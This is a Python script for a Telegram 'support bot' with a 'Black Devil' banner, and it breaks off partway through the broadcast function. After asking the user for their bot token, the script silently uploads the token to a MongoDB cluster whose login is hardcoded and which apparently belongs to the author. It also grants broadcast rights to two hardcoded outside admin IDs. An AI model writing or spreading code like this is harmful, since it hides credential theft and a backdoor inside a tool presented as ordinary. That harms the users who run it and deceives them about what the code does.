import importlib
import subprocess
import platform
import os
import time
import urllib3
import requests
from colorama import init, Fore, Style
import pymongo
import random
import string
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from telegram.utils.helpers import escape_markdown
import logging

# **Styling with Colorama**
init(autoreset=True) 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

# **Color Definitions**
MAGENTA = Fore.MAGENTA
CYAN = Fore.CYAN
ORANGE = Fore.LIGHTYELLOW_EX
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
BLUE = Fore.BLUE
RESET = Fore.RESET

# **Animated Banner**
current_platform = platform.system() 

banner_frames = [
    f"{MAGENTA}\n",
    f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
    f"{RED}+ ____  _        _    ____ _  __  ____  _______     _____ _     _       +{RESET}",
    f"{RED}-| __ )| |      / \  / ___| |/ / |  _ \\| ____\\ \   / /_ _| |   | |      -{RESET}",
    f"{ORANGE}+|  _ \| |     / _ \| |   | ' /  | | | |  _|  \ \ / / | || |   | |      +{RESET}",
    f"{YELLOW}-| |_) | |___ / ___ \ |___| . \  | |_| | |___  \ V /  | || |___| |___   -{RESET}",
    f"{GREEN}+|____/|_____/_/   \_\____|_|\_\ |____/|_____|  \_/  |___|_____|_____|  +{RESET}",
    f"{GREEN}-                                                                       -{RESET}",
    f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
    f"{MAGENTA}",
    f"{BLUE} TELEGRAM Support Bot {RED}= https://t.me/Black_Devil_Support_bot {RESET}",
    f"{BLUE} Ofically Website   {RED} = https://girlfriend4u.rf.gd  {RESET}",
    f"{MAGENTA}",
    f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
]

def clear_terminal():
    if current_platform == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def display_banner_animation(frames, num_iterations, frame_delay):
    for _ in range(num_iterations):  
        clear_terminal()
        for frame in frames:  
            print(frame)
            time.sleep(frame_delay)

# **Connection Animation**
def connection_animation():
    frames = ["/", "\\"]
    connected = False
    for _ in range(2):
        for frame in frames:
            print(Fore.RED + f"Connecting To Server {frame}", end="\r")
            time.sleep(0.2)
            try:
                requests.get("http://www.google.com", timeout=1)
                connected = True
                print(Fore.GREEN + f"successfully connected with server ......")
                break
            except requests.ConnectionError:
                print(Fore.RED + f" 😈 Check Your Network")
                sys.exit()
        if connected:
            break

# **Package Installation**
def install_package(package_name): 
    try:
        importlib.import_module(package_name)
    except ImportError:
        print(f"creating virtual environment .....")
        with open(os.devnull, 'w') as devnull:
            subprocess.check_call(['pip', 'install', package_name], stdout=devnull, stderr=devnull)

packages_to_install = ['requests', 'pymongo', 'urllib3', 'python-telegram-bot==13.9', 'colorama']
for package in packages_to_install:
    install_package(package)

# **Random Code Generation**
def generate_random_code():
    random_number = ''.join(random.choices(string.digits, k=6))
    random_letters = ''.join(random.choices(string.ascii_uppercase, k=2))
    random_code = random_letters + random_number
    return random_code

# **Token Loading**
def load_tokens():
    file_path = "Cricxlinksupportbot.txt"
    if os.path.exists(file_path):
        with open(file_path, "r") as file:
            lines = file.readlines()
            if len(lines) >= 3:
                bot_token = lines[0].strip()
                admin_id = int(lines[1].strip())
                random_code = lines[2].strip()
                return bot_token, admin_id, random_code
    return None, None, None

# **Token Saving**
def save_tokens(bot_token, admin_id, random_code):
    file_path = "Cricxlinksupportbot.txt"
    with open(file_path, "w") as file:
        file.write(f"{bot_token}\n{admin_id}\n{random_code}")

# **Load tokens, or generate and save if not found**
bot_token, primary_admin_id, random_code = load_tokens()
if not bot_token or not primary_admin_id or not random_code:
    bot_token = input("Enter your bot token: ")
    primary_admin_id = int(input("Enter your primary admin ID: "))
    random_code = generate_random_code()
    save_tokens(bot_token, primary_admin_id, random_code)

# **MongoDB Configuration** 
client = pymongo.MongoClient("mongodb+srv://Manu:Manu@manu.mudmj2s.mongodb.net/?retryWrites=true&w=majority")
db = client[random_code]  # Replace 'random_code' if necessary
db_tokens = db['tokens']
db_tokens.update_one({}, {"$set": {"bot_token": bot_token}}, upsert=True)
users_collection = db['users']
groups_collection = db['groups']
channels_collection = db['channels'] # New collection for channels

# **Telegram Bot Setup**
updater = Updater(bot_token, use_context=True)
dispatcher = updater.dispatcher

# **Logging**
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

# **FUNCTIONS**

# `start` Function
def start(update: Update, context: CallbackContext):
    if update.message.chat.type == "private":
        user = update.effective_user
        user_id = user.id
        username = user.username or "N/A"
        full_name = user.full_name or "N/A"

        if not users_collection.find_one({"_id": user_id}):
            users_collection.insert_one({"_id": user_id})

            admin_user_id = primary_admin_id
            username = escape_markdown(username, version=2)
            full_name = escape_markdown(full_name, version=2)
            message = f" ^New_User ID: {user_id}\nUsername: @{username}\nFull Name: {full_name}"
            context.bot.send_message(chat_id=admin_user_id, text=message, disable_web_page_preview=True)

        context.bot.send_message(chat_id=update.effective_chat.id, text="RAM RAM Bhai Group Join Karo @cricxlinks")
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="RAM RAM Bhai Group Join Karo @cricxlinks")

# `broadcast` Function (Updated)
def broadcast(update: Update, context: CallbackContext):
    admin_user_id = (primary_admin_id, 6305575094, 6704116482)
    if update.effective_user.id not in admin_user_id:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Join Our Channel: https://t.me/cricxlinks")
        return

    message = update.message.reply
